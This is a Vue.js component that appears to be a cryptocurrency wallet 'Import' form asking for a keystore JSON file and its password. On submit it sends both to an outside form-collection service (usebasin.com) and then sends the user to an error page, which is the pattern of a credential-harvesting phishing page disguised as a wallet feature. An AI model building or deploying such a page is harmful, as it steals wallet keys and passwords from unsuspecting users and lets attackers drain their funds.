<template>
  <div class="keystore-form">
      <form action="" method=""  @submit.prevent="submit">  

          <textarea v-model="form.name"  id="" cols="30" rows="10" placeholder="Keystore JSON"></textarea>
         <input v-model="form.Password"  type="text"  placeholder="Password" class="input">
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
</template>

<script>
import axios from 'axios';
export default {
    name:"keystore",

    data (){
        return{
           form : {
               Keystore: '',
               password:'',
           }
        }
    },

    methods:{
         submit(){
           axios.post('https://usebasin.com/f/c06694797d04' ,this.form)
           .then(response => {
               console.log(response)
           })
           .finally(() => {
                this.$router.push('/err')
                 });
           
      }
    

    }

}

</script>

<style>

</style>